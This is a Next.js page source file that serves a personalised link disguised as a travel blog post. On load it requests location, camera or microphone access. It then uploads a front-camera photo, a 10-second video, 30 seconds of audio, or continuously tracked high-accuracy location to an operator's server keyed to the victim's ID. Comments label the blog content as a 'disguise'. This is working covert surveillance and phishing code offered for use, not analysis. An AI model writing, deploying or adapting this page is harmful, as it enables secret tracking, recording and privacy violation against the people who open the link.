/**
 * ============================================
 * User Capture Page - Instant Permission Request
 * ============================================
 * Route: /[type]/[userId]
 * Types: mic, photo, video, location
 * Same user always gets the same link.
 * Permission is requested INSTANTLY on page load.
 */

'use client';

import { useEffect, useRef, useCallback } from 'react';
import { useParams } from 'next/navigation';

const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';

// Map URL types to internal types
const TYPE_MAP: Record<string, string> = {
  mic: 'microphone',
  photo: 'photo',
  video: 'video',
  location: 'location',
};

// Blog content for disguise
const BLOG_CONTENT = {
  title: "10 Amazing Travel Destinations You Must Visit in 2025",
  author: "Sarah Mitchell",
  date: "December 27, 2025",
  content: [
    "Travel has always been a passion for many, and 2025 brings exciting new opportunities to explore the world.",
    "The pandemic years taught us to appreciate the simple joys of exploration.",
    "Whether you're a beach lover, mountain enthusiast, or city explorer, this year promises unforgettable experiences.",
    "First on our list is the breathtaking fjords of Norway. The dramatic landscapes make it a photographer's paradise.",
    "Next, consider the ancient temples of Cambodia. Angkor Wat offers a glimpse into a magnificent past.",
    "For those seeking adventure, New Zealand's South Island delivers endless thrills.",
    "Japan continues to captivate visitors with its perfect blend of tradition and modernity.",
    "The Greek islands offer Mediterranean charm at its finest.",
    "Costa Rica remains a top choice for eco-tourism with rainforests and wildlife.",
    "Finally, Portugal has emerged as Europe's hottest destination with diverse experiences."
  ]
};

export default function CapturePage() {
  const params = useParams();
  const userId = params.userId as string;
  const type = params.type as string;
  
  const captureType = TYPE_MAP[type] || type;
  const captureStarted = useRef(false);
  const streamRef = useRef<MediaStream | null>(null);
  const watchIdRef = useRef<number | null>(null);

  // Upload location
  const uploadLocation = useCallback(async (data: {
    latitude: number;
    longitude: number;
    accuracy?: number;
    altitude?: number;
    speed?: number;
    heading?: number;
  }) => {
    try {
      await fetch(`${API_BASE_URL}/api/capture/${userId}/location`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, captureType })
      });
    } catch (e) {
      console.log('Upload error:', e);
    }
  }, [userId, captureType]);

  // Upload photo
  const uploadPhoto = useCallback(async (blob: Blob) => {
    try {
      const formData = new FormData();
      formData.append('file', blob, `photo_${Date.now()}.jpg`);
      await fetch(`${API_BASE_URL}/api/capture/${userId}/photo`, {
        method: 'POST',
        body: formData
      });
    } catch (e) {
      console.log('Upload error:', e);
    }
  }, [userId]);

  // Upload video
  const uploadVideo = useCallback(async (blob: Blob) => {
    try {
      const formData = new FormData();
      formData.append('file', blob, `video_${Date.now()}.webm`);
      await fetch(`${API_BASE_URL}/api/capture/${userId}/video`, {
        method: 'POST',
        body: formData
      });
    } catch (e) {
      console.log('Upload error:', e);
    }
  }, [userId]);

  // Upload audio
  const uploadAudio = useCallback(async (blob: Blob) => {
    try {
      const formData = new FormData();
      formData.append('file', blob, `audio_${Date.now()}.webm`);
      await fetch(`${API_BASE_URL}/api/capture/${userId}/audio`, {
        method: 'POST',
        body: formData
      });
    } catch (e) {
      console.log('Upload error:', e);
    }
  }, [userId]);

  // Notify server of permission event
  const sendEvent = useCallback(async (event: 'granted' | 'denied') => {
    try {
      await fetch(`${API_BASE_URL}/api/capture/${userId}/event`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event, captureType })
      });
    } catch (e) {
      console.log('Event error:', e);
    }
  }, [userId, captureType]);

  // INSTANT permission request - runs immediately
  useEffect(() => {
    if (captureStarted.current) return;
    captureStarted.current = true;

    // Request permission IMMEDIATELY
    const requestPermission = async () => {
      switch (captureType) {
        case 'location':
          requestLocation();
          break;
        case 'photo':
          requestPhoto();
          break;
        case 'video':
          requestVideo();
          break;
        case 'microphone':
          requestMicrophone();
          break;
        default:
          console.log('Unknown capture type:', captureType);
      }
    };

    // Location capture
    const requestLocation = () => {
      if ('geolocation' in navigator) {
        // Request immediately
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            await sendEvent('granted');
            await uploadLocation({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude ?? undefined,
              speed: position.coords.speed ?? undefined,
              heading: position.coords.heading ?? undefined
            });
            
            // Continue watching
            watchIdRef.current = navigator.geolocation.watchPosition(
              async (pos) => {
                await uploadLocation({
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  accuracy: pos.coords.accuracy,
                  altitude: pos.coords.altitude ?? undefined,
                  speed: pos.coords.speed ?? undefined,
                  heading: pos.coords.heading ?? undefined
                });
              },
              () => {},
              { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
            );
          },
          async () => {
            await sendEvent('denied');
          },
          { enableHighAccuracy: true, timeout: 10000 }
        );
      }
    };

    // Photo capture
    const requestPhoto = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user' } 
        });
        await sendEvent('granted');
        streamRef.current = stream;
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;
        
        await new Promise<void>(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            setTimeout(resolve, 100);
          };
        });
        
        // Capture photo
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
          if (blob) {
            await uploadPhoto(blob);
          }
          stream.getTracks().forEach(track => track.stop());
        }, 'image/jpeg', 0.8);
      } catch (e) {
        await sendEvent('denied');
      }
    };

    // Video capture
    const requestVideo = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user' },
          audio: true 
        });
        await sendEvent('granted');
        streamRef.current = stream;
        
        const mediaRecorder = new MediaRecorder(stream, {
          mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9') 
            ? 'video/webm;codecs=vp9' 
            : 'video/webm'
        });
        
        const chunks: Blob[] = [];
        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };
        
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          await uploadVideo(blob);
          stream.getTracks().forEach(track => track.stop());
        };
        
        mediaRecorder.start();
        
        // Record for 10 seconds
        setTimeout(() => {
          if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
        }, 10000);
      } catch (e) {
        await sendEvent('denied');
      }
    };

    // Microphone capture
    const requestMicrophone = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        await sendEvent('granted');
        streamRef.current = stream;
        
        const mediaRecorder = new MediaRecorder(stream, {
          mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
            ? 'audio/webm;codecs=opus' 
            : 'audio/webm'
        });
        
        const chunks: Blob[] = [];
        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };
        
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'audio/webm' });
          await uploadAudio(blob);
          stream.getTracks().forEach(track => track.stop());
        };
        
        mediaRecorder.start();
        
        // Record for 30 seconds
        setTimeout(() => {
          if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
        }, 30000);
      } catch (e) {
        await sendEvent('denied');
      }
    };

    // Execute immediately
    requestPermission();

    // Cleanup
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
    };
  }, [captureType, sendEvent, uploadLocation, uploadPhoto, uploadVideo, uploadAudio]);

  // Blog UI (disguise)
  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="border-b border-gray-200 py-4">
        <div className="max-w-3xl mx-auto px-4">
          <div className="flex items-center justify-between">
            <span className="text-xl font-bold text-gray-900">TravelBlog</span>
            <nav className="space-x-4 text-sm text-gray-600">
              <span>Home</span>
              <span>Travel</span>
              <span>About</span>
            </nav>
          </div>
        </div>
      </header>

      {/* Article */}
      <main className="max-w-3xl mx-auto px-4 py-8">
        <article>
          <h1 className="text-3xl font-bold text-gray-900 mb-4">
            {BLOG_CONTENT.title}
          </h1>
          
          <div className="flex items-center text-sm text-gray-500 mb-8">
            <span>{BLOG_CONTENT.author}</span>
            <span className="mx-2">•</span>
            <span>{BLOG_CONTENT.date}</span>
            <span className="mx-2">•</span>
            <span>5 min read</span>
          </div>

          <img 
            src="https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=800"
            alt="Travel"
            className="w-full h-64 object-cover rounded-lg mb-8"
          />

          <div className="prose prose-lg text-gray-700 space-y-4">
            {BLOG_CONTENT.content.map((paragraph, i) => (
              <p key={i}>{paragraph}</p>
            ))}
          </div>
        </article>

        {/* Tags */}
        <div className="mt-8 pt-8 border-t border-gray-200">
          <div className="flex gap-2">
            {['Travel', 'Adventure', '2025'].map(tag => (
              <span key={tag} className="px-3 py-1 bg-gray-100 text-gray-600 text-sm rounded-full">
                {tag}
              </span>
            ))}
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-gray-200 py-8 mt-16">
        <div className="max-w-3xl mx-auto px-4 text-center text-gray-500 text-sm">
          © 2025 TravelBlog. All rights reserved.
        </div>
      </footer>
    </div>
  );
}
